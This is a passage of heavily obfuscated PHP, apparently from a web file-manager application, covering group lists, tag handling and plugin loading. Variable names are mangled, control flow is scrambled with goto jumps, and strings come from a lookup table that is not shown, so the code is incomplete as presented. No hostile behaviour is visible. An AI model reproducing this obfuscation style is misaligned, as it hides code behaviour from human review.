bŠºÑ¦¸İ; bŠºÑ¦¸İ: } protected function _listDataApplyItem($E©Š£äŸš) { $c–ï ï¸ = array($E©Š£äŸš); $this->_listDataApply($c–ï ï¸); return $c–ï ï¸[0]; } protected function _listDataApply(&$eäî¤÷±) { goto eÒ‡ÆÀÉ˜ó; fğ‰İ¬åäÇ: $this->_listAppendChildren($eäî¤÷±); $this->_listAppendChildrenMember($eäî¤÷±); $this->_listAppendMeta($eäî¤÷±, $b¾Ûîª¥¤Ô); goto E‡«£â‹Î; E‡«£â‹Î: $this->_listAppendParent($eäî¤÷±); $this->_listAppendSourceRoot($eäî¤÷±, $b¾Ûîª¥¤Ô); goto Aœ¿²ùÜ; eÒ‡ÆÀÉ˜ó: $c„–†ö™Ğ =& $_SERVER[…Ò×–]; if (!$eäî¤÷±) { return; } $b¾Ûîª¥¤Ô = array_to_keyvalue($eäî¤÷±, $c„–†ö™Ğ[33], $c„–†ö™Ğ[2119]); goto fğ‰İ¬åäÇ; Aœ¿²ùÜ: } private function _listAppendChildren(&$Aê¸…¬Ï¹) { goto F„£­ÏßŸ‚; fíÎ¸Ä õ: $C§‚‰Œ«ï¸ = array_to_keyvalue($C§‚‰Œ«ï¸, $EƒœªÒ§Ãì[455]); foreach ($Aê¸…¬Ï¹ as &$Aİ…¹•Ë¼¢) { $Aİ…¹•Ë¼¢[$EƒœªÒ§Ãì[2206]] = isset($C§‚‰Œ«ï¸[$Aİ…¹•Ë¼¢[$EƒœªÒ§Ãì[2119]] . $EƒœªÒ§Ãì[2207]]); } unset($Aİ…¹•Ë¼¢); goto E‚Ò÷ÊËŒ; C¢±ì‰²ÚÏ: $A‡ÈÕåí = count($Aê¸…¬Ï¹); $a‘š¸¾©À = $this->tablePrefix . $this->tableName; for ($aêÓ²…­îà = 0, $c†Ó¥…‚‡Ş = 0; $aêÓ²…­îà < $A‡ÈÕåí; $aêÓ²…­îà++) { $c†Ó¥…‚‡Ş++; $eßå¿ÄÆ¸Ë = $Aê¸…¬Ï¹[$aêÓ²…­îà][$EƒœªÒ§Ãì[2119]]; $A‡ø¥õ½˜ê .= "\123\105\114\x45\103\124\x20\x2a\x20\x46\x52\117\115\x20\50\123\105\114\105\x43\124\x20\47{$eßå¿ÄÆ¸Ë}\x5f\143\x68\x69\x6c\144\x27\x20\x61\x73\40\150\141\x73\40\106\x52\117\x4d\x20\x60{$a‘š¸¾©À}\140\40\167\150\x65\x72\145\x20\160\x61\162\x65\156\164\111\104\x3d{$eßå¿ÄÆ¸Ë}\40\154\x69\155\151\164\40\x31\51\40\x61\163\40\164\142\x5f{$eßå¿ÄÆ¸Ë}\x20\x75\156\151\157\156\x20\141\154\x6c\40"; if (($c†Ó¥…‚‡Ş >= 20 || $aêÓ²…­îà == $A‡ÈÕåí - 1) && $A‡ø¥õ½˜ê) { $A‡ø¥õ½˜ê = substr($A‡ø¥õ½˜ê, 0, -strlen($EƒœªÒ§Ãì[454])); $Bˆ†åÇ•ñ = $this->query($A‡ø¥õ½˜ê); $C§‚‰Œ«ï¸ = array_merge($C§‚‰Œ«ï¸, $Bˆ†åÇ•ñ); $c†Ó¥…‚‡Ş = 0; $A‡ø¥õ½˜ê = $EƒœªÒ§Ãì[33]; } } goto fíÎ¸Ä õ; F„£­ÏßŸ‚: $EƒœªÒ§Ãì =& $_SERVER[…Ò×–]; $A‡ø¥õ½˜ê = $EƒœªÒ§Ãì[365]; $C§‚‰Œ«ï¸ = array(); goto C¢±ì‰²ÚÏ; E‚Ò÷ÊËŒ: } private function _listAppendChildrenMember(&$a×É²à†ÈŠ) { goto B¢—Õá¾ĞŠ; B¢—Õá¾ĞŠ: $Dé°­ŸĞÂ‰ =& $_SERVER[…Ò×–]; $eĞ©§ÖÏÂ² = $Dé°­ŸĞÂ‰[365]; $cóñ¹ÁÔ×å = array(); goto f§Ï¾Öé¯¦; f§Ï¾Öé¯¦: $C„ºŸï³á­ = count($a×É²à†ÈŠ); $dİ¹×‡ë¾Ó = $this->tablePrefix . $Dé°­ŸĞÂ‰[2198]; for ($Aù¯Äõí‰ = 0, $AèÃ—­Ò = 0; $Aù¯Äõí‰ < $C„ºŸï³á­; $Aù¯Äõí‰++) { $AèÃ—­Ò++; $CäÙôœì­ë = $a×É²à†ÈŠ[$Aù¯Äõí‰][$Dé°­ŸĞÂ‰[2119]]; $eĞ©§ÖÏÂ² .= "\x53\x45\x4c\x45\x43\x54\40\x2a\x20\x46\x52\x4f\x4d\40\x28\x53\105\114\x45\103\x54\40\x27{$CäÙôœì­ë}\137\x63\150\151\x6c\144\x27\x20\x61\163\x20\150\x61\163\40\106\x52\117\x4d\x20\x60{$dİ¹×‡ë¾Ó}\140\x20\167\x68\x65\x72\x65\40\x67\x72\x6f\x75\x70\111\104\x3d{$CäÙôœì­ë}\x20\154\x69\x6d\151\x74\x20\61\51\40\141\163\40\x74\142\x5f{$CäÙôœì­ë}\x20\x75\156\151\157\156\40\x61\x6c\154\x20"; if (($AèÃ—­Ò >= 20 || $Aù¯Äõí‰ == $C„ºŸï³á­ - 1) && $eĞ©§ÖÏÂ²) { $eĞ©§ÖÏÂ² = substr($eĞ©§ÖÏÂ², 0, -strlen($Dé°­ŸĞÂ‰[454])); $bˆ‹Ú…Ôêé = $this->query($eĞ©§ÖÏÂ²); $cóñ¹ÁÔ×å = array_merge($cóñ¹ÁÔ×å, $bˆ‹Ú…Ôêé); $AèÃ—­Ò = 0; $eĞ©§ÖÏÂ² = $Dé°­ŸĞÂ‰[33]; } } goto eò‰²à¡ò; eò‰²à¡ò: $cóñ¹ÁÔ×å = array_to_keyvalue($cóñ¹ÁÔ×å, $Dé°­ŸĞÂ‰[455]); foreach ($a×É²à†ÈŠ as &$DÌ®Ş ´à) { $DÌ®Ş ´à[$Dé°­ŸĞÂ‰[2208]] = isset($cóñ¹ÁÔ×å[$DÌ®Ş ´à[$Dé°­ŸĞÂ‰[2119]] . $Dé°­ŸĞÂ‰[2207]]); } unset($DÌ®Ş ´à); goto aŒÔÔğ¿Õ; aŒÔÔğ¿Õ: } private function _listAppendMeta(&$C¬‹Ù´¶Ö, $b½áÀ‡¶) { goto D½ÅÓ“Ñ; DƒÂºƒ£™¿: foreach ($C¬‹Ù´¶Ö as &$D£²š¥±) { $D£²š¥±[$c¨æ½•µ÷[421]] = array(); if (isset($cƒğñã˜ö¼[$D£²š¥±[$c¨æ½•µ÷[2119]]])) { $D£²š¥±[$c¨æ½•µ÷[421]] = $cƒğñã˜ö¼[$D£²š¥±[$c¨æ½•µ÷[2119]]]; } } unset($D£²š¥±); goto e¿¬ÈĞ…ˆÊ; b¯µë—ßï: $cƒğñã˜ö¼ = array_to_keyvalue_group($cƒğñã˜ö¼, $c¨æ½•µ÷[2119]); foreach ($cƒğñã˜ö¼ as &$bÂŞô“®ª) { $bÂŞô“®ª = array_to_keyvalue($bÂŞô“®ª, $c¨æ½•µ÷[89], $c¨æ½•µ÷[363]); } unset($bÂŞô“®ª); goto DƒÂºƒ£™¿; D½ÅÓ“Ñ: $c¨æ½•µ÷ =& $_SERVER[…Ò×–]; $dç¥ØÕâ§½ = array($c¨æ½•µ÷[2119] => array($c¨æ½•µ÷[7], $b½áÀ‡¶)); $cƒğñã˜ö¼ = Model($c¨æ½•µ÷[2197])->where($dç¥ØÕâ§½)->select(); goto b¯µë—ßï; e¿¬ÈĞ…ˆÊ: } protected function parentLevelArray($e–Ìµ—øÖ) { $Bí‡Öâé =& $_SERVER[…Ò×–]; $e–Ìµ—øÖ = explode($Bí‡Öâé[47], trim($e–Ìµ—øÖ, $Bí‡Öâé[47])); $e–Ìµ—øÖ = array_remove_value($e–Ìµ—øÖ, $Bí‡Öâé[473]); return $e–Ìµ—øÖ; } private function _listAppendParent(&$E±òˆ©š•é) { goto Eœëùƒè; Eœëùƒè: $d¤Ã‰ßØ„è =& $_SERVER[…Ò×–]; $bá™âõ÷­  = array(); foreach ($E±òˆ©š•é as &$fÁ“Ö‘£°•) { $bá™âõ÷­ [$fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[2119]]] = $fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[28]]; $B‹ùëäÉªÂ = $this->parentLevelArray($fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[464]]); foreach ($B‹ùëäÉªÂ as $B“½‹‡µà) { if (!isset($bá™âõ÷­ [$B“½‹‡µà])) { $bá™âõ÷­ [$B“½‹‡µà] = 0; } } } goto c²¿‹ÊÅ¹Š; E¤ôå¹±: unset($fÁ“Ö‘£°•); goto AˆÔŸà˜Ö; e¨†³ÜÆ½ƒ: if ($e¹‹–‰è ’) { $bÀˆæÆ„Š = array($d¤Ã‰ßØ„è[2196] => array($d¤Ã‰ßØ„è[388], $e¹‹–‰è ’)); $dØÙ‘ Ä½İ = $this->field($d¤Ã‰ßØ„è[2209])->where($bÀˆæÆ„Š)->select(); $Cİñ¨Ü™Ø = array_to_keyvalue($dØÙ‘ Ä½İ, $d¤Ã‰ßØ„è[2119], $d¤Ã‰ßØ„è[28]); $bá™âõ÷­  = array_merge_index($bá™âõ÷­ , $Cİñ¨Ü™Ø); } $aäŞğôÄï = $GLOBALS[$d¤Ã‰ßØ„è[6]][$d¤Ã‰ßØ„è[84]][$d¤Ã‰ßØ„è[2210]]; foreach ($E±òˆ©š•é as &$fÁ“Ö‘£°•) { $B‹ùëäÉªÂ = $this->parentLevelArray($fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[464]]); $eÖã²§¸‚« = $d¤Ã‰ßØ„è[33]; foreach ($B‹ùëäÉªÂ as $EÒªŞ¦Ö => $B“½‹‡µà) { if ($aäŞğôÄï && $EÒªŞ¦Ö == 0) { continue; } $eÖã²§¸‚« .= $bá™âõ÷­ [$B“½‹‡µà] . $d¤Ã‰ßØ„è[8]; } if ($B‹ùëäÉªÂ) { $eÖã²§¸‚« .= $fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[28]]; } $fÁ“Ö‘£°•[$d¤Ã‰ßØ„è[468]] = str_replace($d¤Ã‰ßØ„è[472], $d¤Ã‰ßØ„è[8], $eÖã²§¸‚«); } goto E¤ôå¹±; c²¿‹ÊÅ¹Š: unset($fÁ“Ö‘£°•); $e¹‹–‰è ’ = array(); foreach ($bá™âõ÷­  as $EÒªŞ¦Ö => $Fæ°Ëï¼ˆ) { if (!$Fæ°Ëï¼ˆ) { $e¹‹–‰è ’[] = $EÒªŞ¦Ö; } } goto e¨†³ÜÆ½ƒ; AˆÔŸà˜Ö: } private function _listAppendSourceRoot(&$b’ÑóäÎ”, $c»°ÜùÕ…é) { goto Eˆœ¿²´·; Eˆœ¿²´·: $C’³à «½Ù =& $_SERVER[…Ò×–]; $d©¡øãŠ‰ = array($C’³à «½Ù[375] => SourceModel::TYPE_GROUP, $C’³à «½Ù[466] => 0, $C’³à «½Ù[461] => array($C’³à «½Ù[7], $c»°ÜùÕ…é)); $b†‹ÍŠ‡ « = $C’³à «½Ù[2211]; goto AöòƒëèĞ‹; AöòƒëèĞ‹: $b¿è±ôô¶ = Model($C’³à «½Ù[757])->order($C’³à «½Ù[2212])->field($b†‹ÍŠ‡ «)->where($d©¡øãŠ‰)->select(); $b¿è±ôô¶ = array_to_keyvalue($b¿è±ôô¶, $C’³à «½Ù[461]); $b¿è±ôô¶ = array_remove_key($b¿è±ôô¶, $C’³à «½Ù[461]); goto a±„±ßœ”¥; a±„±ßœ”¥: foreach ($b’ÑóäÎ” as &$B†Éâ¶•) { $B†Éâ¶•[$C’³à «½Ù[395]] = $b¿è±ôô¶[$B†Éâ¶•[$C’³à «½Ù[2119]]] ? $b¿è±ôô¶[$B†Éâ¶•[$C’³à «½Ù[2119]]] : array(); } unset($B†Éâ¶•); goto C¬¥³Í‚ó; C¬¥³Í‚ó: } protected function groupMerge($F¯÷¾®‚âô) { $F¯÷¾®‚âô = array_values(array_unique($F¯÷¾®‚âô)); $FÍ«ùí = array(); for ($CóÔˆŠ±™â = 0; $CóÔˆŠ±™â < count($F¯÷¾®‚âô); $CóÔˆŠ±™â++) { $E™‰«ÊÀ±œ = !1; for ($D¦Ì´¶”Œ = 0; $D¦Ì´¶”Œ < count($F¯÷¾®‚âô); $D¦Ì´¶”Œ++) { if ($CóÔˆŠ±™â == $D¦Ì´¶”Œ) { continue; } if ($this->isParentOf($F¯÷¾®‚âô[$D¦Ì´¶”Œ], $F¯÷¾®‚âô[$CóÔˆŠ±™â])) { $E™‰«ÊÀ±œ = !0; break; } } if (!$E™‰«ÊÀ±œ) { $FÍ«ùí[] = $F¯÷¾®‚âô[$CóÔˆŠ±™â]; } } return $FÍ«ùí; } protected function isParentOf($D¤½®ÒÒ…×, $a¢µÂ°©«‰) { goto b¢‰ï«ËÎ; c…”¹ÆøãÅ: return !1; goto Fˆ´µ»ñì; B¾ÆÔ¾Â³: $eßÚ¿³õæ = $this->getInfoSimple($a¢µÂ°©«‰); $E¤¸ºïÁ›» = $Bá³‹Şó[$Bœª¸§øñ[464]] . $D¤½®ÒÒ…× . $Bœª¸§øñ[47]; if (substr($eßÚ¿³õæ[$Bœª¸§øñ[464]], 0, strlen($E¤¸ºïÁ›»)) == $E¤¸ºïÁ›») { return !0; } goto c…”¹ÆøãÅ; b¢‰ï«ËÎ: $Bœª¸§øñ =& $_SERVER[…Ò×–]; if (!$D¤½®ÒÒ…× || !$a¢µÂ°©«‰ || $D¤½®ÒÒ…× == $a¢µÂ°©«‰) { return !1; } $Bá³‹Şó = $this->getInfoSimple($D¤½®ÒÒ…×); goto B¾ÆÔ¾Â³; Fˆ´µ»ñì: } public function groupShowRoot($d¦¯ÒÛ´Ú¿, $FÉÀ¿Æ‡·Ö = false) { goto Bğ—İ‹„Éõ; aï¦†êˆæÊ: $c‚ÓÏ…ë’ = $this->parentLevelArray($f¾·Æ°±[$cç„½’êËÔ[464]]); $F²ŒŠ„”Í’ = array($d¦¯ÒÛ´Ú¿); if (count($c‚ÓÏ…ë’) == 0) { return $F²ŒŠ„”Í’; } goto a›¸‰¯­Ê; a›¸‰¯­Ê: if ($FÉÀ¿Æ‡·Ö && count($c‚ÓÏ…ë’) == 1) { return $F²ŒŠ„”Í’; } if (!$f¾·Æ°±[$cç„½’êËÔ[421]] || !isset($f¾·Æ°±[$cç„½’êËÔ[421]][$cç„½’êËÔ[2194]]) || $f¾·Æ°±[$cç„½’êËÔ[421]][$cç„½’êËÔ[2194]] == $cç„½’êËÔ[2168]) { return $this->groupShowRoot($c‚ÓÏ…ë’[count($c‚ÓÏ…ë’) - 1], $FÉÀ¿Æ‡·Ö); } if ($f¾·Æ°±[$cç„½’êËÔ[421]][$cç„½’êËÔ[2194]] == $cç„½’êËÔ[350]) { $aìƒÎ™ÈíØ = explode($cç„½’êËÔ[47], $f¾·Æ°±[$cç„½’êËÔ[421]][$cç„½’êËÔ[2195]]); if ($aìƒÎ™ÈíØ) { $F²ŒŠ„”Í’ = array_merge($F²ŒŠ„”Í’, $aìƒÎ™ÈíØ); } } goto e°¼îë‰; Bğ—İ‹„Éõ: $cç„½’êËÔ =& $_SERVER[…Ò×–]; $f¾·Æ°± = $this->getInfo($d¦¯ÒÛ´Ú¿); if (!$f¾·Æ°±) { return array(); } goto aï¦†êˆæÊ; e°¼îë‰: return $F²ŒŠ„”Í’; goto açİ’ÍİŠ; açİ’ÍİŠ: } protected function resetParentLevel() { $f´„½Œš =& $_SERVER[…Ò×–]; $e—ª ´»ñè = $f´„½Œš[2119]; $açÀŠÈÁñİ = $this->select(); $açÀŠÈÁñİ = array_to_keyvalue($açÀŠÈÁñİ, $e—ª ´»ñè); foreach ($açÀŠÈÁñİ as $bİ¤ÁŸ·) { goto Dæ»Ú’á¯Æ; BŞ›ğ°–«Œ: $this->where(array($e—ª ´»ñè => $bİ¤ÁŸ·[$e—ª ´»ñè]))->save(array($f´„½Œš[530] => $EŸ‡Óòˆ )); goto eŠßÖÅŠ ²; Dæ»Ú’á¯Æ: $F‹£“…Âê· = $bİ¤ÁŸ·; $EŸ‡Óòˆ  = array(); while ($F‹£“…Âê·[$f´„½Œš[466]] != 0) { $EŸ‡Óòˆ [] = $F‹£“…Âê·[$f´„½Œš[466]]; $F‹£“…Âê· = $açÀŠÈÁñİ[$F‹£“…Âê·[$f´„½Œš[466]]]; } goto EÀ¬£Ùâïç; EÀ¬£Ùâïç: $EŸ‡Óòˆ [] = 0; $EŸ‡Óòˆ  = $f´„½Œš[47] . implode($f´„½Œš[47], array_reverse($EŸ‡Óòˆ )) . $f´„½Œš[47]; $this->setNamePinyin($bİ¤ÁŸ·[$e—ª ´»ñè], $bİ¤ÁŸ·[$f´„½Œš[28]]); goto BŞ›ğ°–«Œ; eŠßÖÅŠ ²: } return $açÀŠÈÁñİ; } public function groupNameAuto($EÁ×¿Ş¤Ò, $fæƒšÈ–ÆÀ) { $F¤ÕˆÌÓ« =& $_SERVER[…Ò×–]; $d¬ä¶ÍÆøÍ = $this->where(array($F¤ÕˆÌÓ«[372] => $EÁ×¿Ş¤Ò))->getField($F¤ÕˆÌÓ«[28], !0); if (!$d¬ä¶ÍÆøÍ || !in_array($fæƒšÈ–ÆÀ, $d¬ä¶ÍÆøÍ)) { return $fæƒšÈ–ÆÀ; } for ($FÉêÎâñï = 1; $FÉêÎâñï <= count($d¬ä¶ÍÆøÍ) + 1; $FÉêÎâñï++) { $B¿µê‰ ç¸ = $fæƒšÈ–ÆÀ . "\x28{$FÉêÎâñï}\x29"; if (!in_array($B¿µê‰ ç¸, $d¬ä¶ÍÆøÍ)) { return $B¿µê‰ ç¸; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($F–Ø©ÎÁÇ) { $C‘÷“Æ˜ =& $_SERVER[…Ò×–]; return array($C‘÷“Æ˜[2213] => array($F–Ø©ÎÁÇ[0], $C‘÷“Æ˜[2214]), $C‘÷“Æ˜[2215] => array($F–Ø©ÎÁÇ[0], $C‘÷“Æ˜[2216])); } protected function get($aŞ»“ÀÏÔ) { $EÉ¯’ˆ…Ô‰ =& $_SERVER[…Ò×–]; $d¯ë»ÃÒµ = Model($EÉ¯’ˆ…Ô‰[463])->metaGet($aŞ»“ÀÏÔ, $EÉ¯’ˆ…Ô‰[2217]); $a¬‹ƒ‘Õ­± = json_decode($d¯ë»ÃÒµ, !0); return $a¬‹ƒ‘Õ­± ? $a¬‹ƒ‘Õ­± : array($EÉ¯’ˆ…Ô‰[2218] => $EÉ¯’ˆ…Ô‰[83], $EÉ¯’ˆ…Ô‰[358] => array()); } protected function set($F¹íÂ‚‰ï†, $bØÄé‹ô„ô) { $B³¬¦çµ =& $_SERVER[…Ò×–]; $bØÄé‹ô„ô = $bØÄé‹ô„ô ? $bØÄé‹ô„ô : array($B³¬¦çµ[2218] => $B³¬¦çµ[83], $B³¬¦çµ[358] => array()); Model($B³¬¦çµ[463])->metaSet($F¹íÂ‚‰ï†, $B³¬¦çµ[2217], json_encode($bØÄé‹ô„ô)); return Model($B³¬¦çµ[463])->metaSet($F¹íÂ‚‰ï†, $B³¬¦çµ[2217], json_encode($bØÄé‹ô„ô)); } protected function getByTagID($AÌ¢Çà‘, $eÅí¡´Ïœ) { goto EŞ‰Í­ÍÙ–; EÙÂ¼Ë§Ó: $bŞë·Øè® = $this->get($AÌ¢Çà‘); if (!$bŞë·Øè® || !isset($bŞë·Øè®[$dÌõí¼ôÆ [358]])) { return !1; } $DøíŠõ”˜ª = array_find_by_field($bŞë·Øè®[$dÌõí¼ôÆ [358]], $dÌõí¼ôÆ [371], $eÅí¡´Ïœ); goto bËñğ—»îÂ; bËñğ—»îÂ: return is_array($DøíŠõ”˜ª) ? $DøíŠõ”˜ª : !1; goto Fò¨Ãº‰‘; EŞ‰Í­ÍÙ–: $dÌõí¼ôÆ  =& $_SERVER[…Ò×–]; if (!$AÌ¢Çà‘ || !$eÅí¡´Ïœ) { return !1; } if (!Model($dÌõí¼ôÆ [463])->getInfoSimple($AÌ¢Çà‘)) { return !1; } goto EÙÂ¼Ë§Ó; Fò¨Ãº‰‘: } public function listSource($aÏÒã«×å, $Fˆ…íÊ‹…) { goto b§ğÀòäˆ§; Bè¸›Ûõ˜…: foreach ($A¿Âò§›Õ× as $eìĞ¸˜µêÑ => $aÈóöâ¬) { $b§ÌöçáÃ­ = !0; if (!$Fˆ…íÊ‹…) { $b»ÇÎ˜Îš·[] = $eìĞ¸˜µêÑ; continue; } foreach ($Fˆ…íÊ‹… as $AÉÌÁ˜ÚÜÜ) { if (!in_array($AÉÌÁ˜ÚÜÜ, $aÈóöâ¬)) { $b§ÌöçáÃ­ = !1; break; } } if ($b§ÌöçáÃ­) { $b»ÇÎ˜Îš·[] = $eìĞ¸˜µêÑ; } } if (!$b»ÇÎ˜Îš·) { return array(); } $aŞ÷ŠÖ­Èê = Model($b­Ã« …›[1127])->listSource(array($b­Ã« …›[387] => array($b­Ã« …›[388], $b»ÇÎ˜Îš·))); goto dõğÛÂ…è–; b§ğÀòäˆ§: $b­Ã« …› =& $_SERVER[…Ò×–]; if ($Fˆ…íÊ‹… && !is_array($Fˆ…íÊ‹…)) { $Fˆ…íÊ‹… = array($Fˆ…íÊ‹…); } $Fô¥öîæØÔ = $this->listData($aÏÒã«×å); goto f—‘Ó; fÓÂÃôâ¤¥: if ($AöÉ«ÒØ¢î) { $this->removeBySource($aÏÒã«×å, $AöÉ«ÒØ¢î); } return $aŞ÷ŠÖ­Èê; goto D‘„è®Îõî; C× ØšòÀ: $BÓø–Ûé‹ = array_to_keyvalue($aŞ÷ŠÖ­Èê[$b­Ã« …›[73]], $b­Ã« …›[33], $b­Ã« …›[373]); $B…ÀŒŒ‹´ = array_merge($BÓø–Ûé‹, $AÆ÷ºÑ†); foreach ($b»ÇÎ˜Îš· as $DæéÑ÷ÈÈ) { if (!in_array($DæéÑ÷ÈÈ, $B…ÀŒŒ‹´)) { $AöÉ«ÒØ¢î[] = $DæéÑ÷ÈÈ; } } goto fÓÂÃôâ¤¥; dõğÛÂ…è–: if (!$aŞ÷ŠÖ­Èê || count($b»ÇÎ˜Îš·) == $aŞ÷ŠÖ­Èê[$b­Ã« …›[355]][$b­Ã« …›[356]]) { return $aŞ÷ŠÖ­Èê; } $AöÉ«ÒØ¢î = array(); $AÆ÷ºÑ† = array_to_keyvalue($aŞ÷ŠÖ­Èê[$b­Ã« …›[74]], $b­Ã« …›[33], $b­Ã« …›[373]); goto C× ØšòÀ; f—‘Ó: $A¿Âò§›Õ× = array(); foreach ($Fô¥öîæØÔ as $fÂêØİ¹´) { $DæéÑ÷ÈÈ = $fÂêØİ¹´[$b­Ã« …›[75]]; if (!$DæéÑ÷ÈÈ) { continue; } if (!isset($A¿Âò§›Õ×[$DæéÑ÷ÈÈ])) { $A¿Âò§›Õ×[$DæéÑ÷ÈÈ] = array(); } $A¿Âò§›Õ×[$DæéÑ÷ÈÈ][] = $fÂêØİ¹´[$b­Ã« …›[397]]; } $b»ÇÎ˜Îš· = array(); goto Bè¸›Ûõ˜…; D‘„è®Îõî: } protected function listData($fâ§ê™ÉœÎ) { $C¨ÌÊŞÀ– =& $_SERVER[…Ò×–]; $a‡ÜÌ‰„± = array($C¨ÌÊŞÀ–[1441] => 0, $C¨ÌÊŞÀ–[439] => array($C¨ÌÊŞÀ–[2219], 0), $C¨ÌÊŞÀ–[392] => $C¨ÌÊŞÀ–[2220] . $fâ§ê™ÉœÎ); $CËÓ‘å’©Ç = $C¨ÌÊŞÀ–[2221]; $Eñ‡‘Ğ‹Ã• = $this->field($CËÓ‘å’©Ç)->where($a‡ÜÌ‰„±)->order($C¨ÌÊŞÀ–[2222])->select(); return $Eñ‡‘Ğ‹Ã• ? $Eñ‡‘Ğ‹Ã• : array(); } protected function addToTag($f­ø‚ë”ì‹, $A‰‰Æóºó, $f£©øì¥ìÛ) { $C“¢¶’ø¿Ç =& $_SERVER[…Ò×–]; if (!$this->getByTagID($f­ø‚ë”ì‹, $f£©øì¥ìÛ) || !$A‰‰Æóºó) { return !1; } if (!Model($C“¢¶’ø¿Ç[757])->pathInfo($A‰‰Æóºó)) { return !1; } $FĞ¡İ¸¥£ = array($C“¢¶’ø¿Ç[1441] => 0, $C“¢¶’ø¿Ç[439] => $f£©øì¥ìÛ, $C“¢¶’ø¿Ç[391] => $A‰‰Æóºó, $C“¢¶’ø¿Ç[392] => $C“¢¶’ø¿Ç[2223] . $f­ø‚ë”ì‹, $C“¢¶’ø¿Ç[390] => $C“¢¶’ø¿Ç[33], $C“¢¶’ø¿Ç[2123] => 0); if ($this->where($FĞ¡İ¸¥£)->find()) { return !1; } return $this->add($FĞ¡İ¸¥£); } protected function removeFromTag($B­…å³“®, $FÌºö‡ãŸ¶, $a¬âšõ¶îÃ) { $eÔ¼ê÷¿ë =& $_SERVER[…Ò×–]; if (!$this->getByTagID($B­…å³“®, $a¬âšõ¶îÃ) || !$FÌºö‡ãŸ¶) { return !1; } if (is_array($FÌºö‡ãŸ¶)) { $FÌºö‡ãŸ¶ = array($eÔ¼ê÷¿ë[7], $FÌºö‡ãŸ¶); } $b³Éª¾Ó…ğ = array($eÔ¼ê÷¿ë[1441] => 0, $eÔ¼ê÷¿ë[439] => $a¬âšõ¶îÃ, $eÔ¼ê÷¿ë[392] => $eÔ¼ê÷¿ë[2223] . $B­…å³“®, $eÔ¼ê÷¿ë[391] => $FÌºö‡ãŸ¶); return $this->where($b³Éª¾Ó…ğ)->delete(); } protected function removeByTag($c Ô˜£¨Ãµ, $F¸¥¼¿®ç÷) { $eéÙ©Ç„¢İ =& $_SERVER[…Ò×–]; if (!$this->getByTagID($c Ô˜£¨Ãµ, $F¸¥¼¿®ç÷)) { return !1; } $dÁ“´´ãƒÀ = array($eéÙ©Ç„¢İ[1441] => 0, $eéÙ©Ç„¢İ[439] => $F¸¥¼¿®ç÷, $eéÙ©Ç„¢İ[392] => $eéÙ©Ç„¢İ[2223] . $c Ô˜£¨Ãµ); return $this->where($dÁ“´´ãƒÀ)->delete(); } protected function removeBySource($b¥•¦†ßÁã, $D™ĞÆÏ¤ªÕ) { $eÉéœœ„¨† =& $_SERVER[…Ò×–]; if (!$b¥•¦†ßÁã || !$D™ĞÆÏ¤ªÕ) { return !1; } if (is_array($D™ĞÆÏ¤ªÕ)) { $D™ĞÆÏ¤ªÕ = array($eÉéœœ„¨†[7], $D™ĞÆÏ¤ªÕ); } $EÛÈáæè  = array($eÉéœœ„¨†[1441] => 0, $eÉéœœ„¨†[391] => $D™ĞÆÏ¤ªÕ, $eÉéœœ„¨†[439] => array($eÉéœœ„¨†[934], 0), $eÉéœœ„¨†[392] => $eÉéœœ„¨†[2223] . $b¥•¦†ßÁã); return $this->where($EÛÈáæè )->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x70\154\165\147\151\x6e\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x74\141\x74\x75\x73", "\162\x65\x67\x69\x65\163\x74", "\x63\x6f\156\146\151\147"); public function loadList($c™¢ˆè³ = false) { $b¦®ŸîÖ‡ = array_to_keyvalue($this->listData(), $_SERVER[…Ò×–][28]); if ($c™¢ˆè³) { return $b¦®ŸîÖ‡[$c™¢ˆè³]; } return $b¦®ŸîÖ‡; } public function init() { $AÆä¢¡Áë· =& $_SERVER[…Ò×–]; Hook::trigger($AÆä¢¡Áë·[2224]); $Dª¬ò”ƒ¼  = $this->loadPluginList(); foreach ($Dª¬ò”ƒ¼  as $A—™ˆ¢Å¿ò => $eªâŠàß“Á) { $b®ïÔªØİÆ = $this->appAllow($A—™ˆ¢Å¿ò, $eªâŠàß“Á); if (!$b®ïÔªØİÆ) { continue; } foreach ($eªâŠàß“Á[$AÆä¢¡Áë·[2225]] as $dî†¹‘…‹¼ => $Eîó¶Ç÷œÃ) { Hook::bind($dî†¹‘…‹¼, $Eîó¶Ç÷œÃ); } } Hook::trigger($AÆä¢¡Áë·[2226]); Hook::trigger(ACTION); } public function appAllow($A’²ŒâÔ¿ˆ, $Bº°¸˜‹á, $F‰Õ¥çÀ¾ = true) { $FÃ—…ö®Š© =& $_SERVER[…Ò×–]; $d‘Š·ß¥¹ = PLUGIN_DIR . $A’²ŒâÔ¿ˆ . $FÃ—…ö®Š©[2227]; if (!is_array($Bº°¸˜‹á) || !is_array($Bº°¸˜‹á[$FÃ—…ö®Š©[2225]]) || !is_file($d‘Š·ß¥¹) || $Bº°¸˜‹á[$FÃ—…ö®Š©[694]] != 1) { return !1; } if ($F‰Õ¥çÀ¾ && !Action($FÃ—…ö®Š©[2228])->checkAuth($A’²ŒâÔ¿ˆ)) { return !1; } return !0; } public function unInstall($B¥µ†È) { $e…Å½…Š­› =& $_SERVER[…Ò×–]; $e‘ÉÄ§ = $this->loadList($B¥µ†È); if (file_exists(PLUGIN_DIR . $B¥µ†È)) { Hook::apply($B¥µ†È . $e…Å½…Š­›[2229]); } $this->remove($e‘ÉÄ§[$e…Å½…Š­›[371]]); } public function changeStatus($Fê½„ÒÄ–, $B«˜á‰÷¿Æ) { $bªÊÖ•™¦ =& $_SERVER[…Ò×–]; $Aâ“˜–‡‘ = $this->loadList($Fê½„ÒÄ–); if ($B«˜á‰÷¿Æ) { Hook::apply($Fê½„ÒÄ– . $bªÊÖ•™¦[2230]); } $this->update($Aâ“˜–‡‘[$bªÊÖ•™¦[371]], array($bªÊÖ•™¦[2231] => $B«˜á‰÷¿Æ)); } public function appRegist($dÎ¡»Î—’¤, $b­ù…†‡Åğ) { $d­ìŒ…Ë‘ =& $_SERVER[…Ò×–]; $D¨›ô¼À‰Ò = $this->loadList($dÎ¡»Î—’¤); if ($D¨›ô¼À‰Ò) { 